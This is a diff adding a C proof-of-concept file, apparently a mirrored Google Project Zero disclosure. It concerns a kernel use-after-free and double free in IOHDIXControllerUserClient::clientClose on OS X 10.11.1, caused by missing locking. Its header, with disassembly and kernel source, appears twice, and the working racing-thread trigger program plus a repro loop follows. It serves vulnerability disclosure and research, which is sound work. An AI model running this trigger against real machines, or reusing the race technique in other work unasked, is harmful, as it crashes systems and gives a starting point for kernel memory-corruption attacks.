@@ -1,0 +1,169 @@
+/*
+Source: https://code.google.com/p/google-security-research/issues/detail?id=599
+
+OS X and iOS kernel UaF/double free due to lack of locking in IOHDIXControllUserClient::clientClose
+
+Here's the clientClose method of IOHDIXControllUserClient on OS X 10.11.1:
+
+__text:0000000000005B38 ; __int64 __fastcall IOHDIXControllerUserClient::clientClose(IOHDIXControllerUserClient *__hidden this)
+__text:0000000000005B38                 public __ZN26IOHDIXControllerUserClient11clientCloseEv
+__text:0000000000005B38 __ZN26IOHDIXControllerUserClient11clientCloseEv proc near
+__text:0000000000005B38                                         ; DATA XREF: __const:000000000000F820o
+__text:0000000000005B38                 push    rbp
+__text:0000000000005B39                 mov     rbp, rsp
+__text:0000000000005B3C                 push    rbx
+__text:0000000000005B3D                 push    rax
+__text:0000000000005B3E                 mov     rbx, rdi
+__text:0000000000005B41                 mov     rax, [rbx]
+__text:0000000000005B44                 xor     esi, esi
+__text:0000000000005B46                 call    qword ptr [rax+600h] ; virtual: IOService::terminate(unsigned int)
+__text:0000000000005B4C                 mov     qword ptr [rbx+208h], 0
+__text:0000000000005B57                 mov     qword ptr [rbx+1F8h], 0
+__text:0000000000005B62                 mov     rdi, [rbx+200h]              ; <-- this+0x200           --+
+__text:0000000000005B69                 call    _vfs_context_rele            ; pass to vfs_context_rele   +- should be locked!
+__text:0000000000005B6E                 mov     qword ptr [rbx+200h], 0      ; NULL out this+0x200      --+
+__text:0000000000005B79                 xor     eax, eax
+__text:0000000000005B7B                 add     rsp, 8
+__text:0000000000005B7F                 pop     rbx
+__text:0000000000005B80                 pop     rbp
+__text:0000000000005B81                 retn
+
+At offset +0x200 the user client has a vfs_context_t (struct vfs_context*) which gets passed to vfs_context_rele:
+
+int
+vfs_context_rele(vfs_context_t ctx)
+{
+  if (ctx) {
+    if (IS_VALID_CRED(ctx->vc_ucred))
+      kauth_cred_unref(&ctx->vc_ucred);
+    kfree(ctx, sizeof(struct vfs_context));
+  }
+  return(0);
+}
+
+This code drop the ref which the context object holds on the credential it holds then it frees the vfs context;
+
+Since there are no locks in the clientClose method two thread can race each other to both read a valid vfs_context_t pointer
+before the other one NULLs it out. There are a few possible bad things which we can make happen here; we can double drop the reference
+on the credential and double free the vfs_context.
+
+This PoC when run on a machine with -zc and -zp boot args will probably crash doing the double ref drop. 
+
+Tested on El Capitan 10.11.1 15b42 on MacBookAir 5,2
+*/
+
+// ianbeer
+
+// clang -o ioparallel_closehdix ioparallel_closehdix.c -lpthread -framework IOKit
+/*
+OS X and iOS kernel UaF/double free due to lack of locking in IOHDIXControllUserClient::clientClose
+
+Here's the clientClose method of IOHDIXControllUserClient on OS X 10.11.1:
+
+__text:0000000000005B38 ; __int64 __fastcall IOHDIXControllerUserClient::clientClose(IOHDIXControllerUserClient *__hidden this)
+__text:0000000000005B38                 public __ZN26IOHDIXControllerUserClient11clientCloseEv
+__text:0000000000005B38 __ZN26IOHDIXControllerUserClient11clientCloseEv proc near
+__text:0000000000005B38                                         ; DATA XREF: __const:000000000000F820o
+__text:0000000000005B38                 push    rbp
+__text:0000000000005B39                 mov     rbp, rsp
+__text:0000000000005B3C                 push    rbx
+__text:0000000000005B3D                 push    rax
+__text:0000000000005B3E                 mov     rbx, rdi
+__text:0000000000005B41                 mov     rax, [rbx]
+__text:0000000000005B44                 xor     esi, esi
+__text:0000000000005B46                 call    qword ptr [rax+600h] ; virtual: IOService::terminate(unsigned int)
+__text:0000000000005B4C                 mov     qword ptr [rbx+208h], 0
+__text:0000000000005B57                 mov     qword ptr [rbx+1F8h], 0
+__text:0000000000005B62                 mov     rdi, [rbx+200h]              ; <-- this+0x200           --+
+__text:0000000000005B69                 call    _vfs_context_rele            ; pass to vfs_context_rele   +- should be locked!
+__text:0000000000005B6E                 mov     qword ptr [rbx+200h], 0      ; NULL out this+0x200      --+
+__text:0000000000005B79                 xor     eax, eax
+__text:0000000000005B7B                 add     rsp, 8
+__text:0000000000005B7F                 pop     rbx
+__text:0000000000005B80                 pop     rbp
+__text:0000000000005B81                 retn
+
+At offset +0x200 the user client has a vfs_context_t (struct vfs_context*) which gets passed to vfs_context_rele:
+
+int
+vfs_context_rele(vfs_context_t ctx)
+{
+  if (ctx) {
+    if (IS_VALID_CRED(ctx->vc_ucred))
+      kauth_cred_unref(&ctx->vc_ucred);
+    kfree(ctx, sizeof(struct vfs_context));
+  }
+  return(0);
+}
+
+This code drop the ref which the context object holds on the credential it holds then it frees the vfs context;
+
+Since there are no locks in the clientClose method two thread can race each other to both read a valid vfs_context_t pointer
+before the other one NULLs it out. There are a few possible bad things which we can make happen here; we can double drop the reference
+on the credential and double free the vfs_context.
+
+This PoC when run on a machine with -zc and -zp boot args will probably crash doing the double ref drop. 
+
+Tested on El Capitan 10.11.1 15b42 on MacBookAir 5,2
+
+repro: while true; do ./ioparallel_closehdix; done
+*/ 
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <mach/mach.h>
+#include <mach/thread_act.h>
+
+#include <pthread.h>
+#include <unistd.h>
+
+#include <IOKit/IOKitLib.h>
+
+io_connect_t conn = MACH_PORT_NULL;
+
+int start = 0;
+
+void close_it(io_connect_t conn) {
+  IOServiceClose(conn);
+}
+
+void go(void* arg){
+
+  while(start == 0){;}
+
+  usleep(1);
+
+  close_it(*(io_connect_t*)arg);
+}
+
+int main(int argc, char** argv) {
+  char* service_name = "IOHDIXController";
+  int client_type = 0;
+
+  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(service_name));
+  if (service == MACH_PORT_NULL) {
+    printf("can't find service\n");
+    return 0;
+  }
+
+  IOServiceOpen(service, mach_task_self(), client_type, &conn);
+  if (conn == MACH_PORT_NULL) {
+    printf("can't connect to service\n");
+    return 0;
+  }
+
+  pthread_t t;
+  io_connect_t arg = conn;
+  pthread_create(&t, NULL, (void*) go, (void*) &arg);
+
+  usleep(100000);
+
+  start = 1;
+
+  close_it(conn);
+
+  pthread_join(t, NULL);
+
+  return 0;
+}
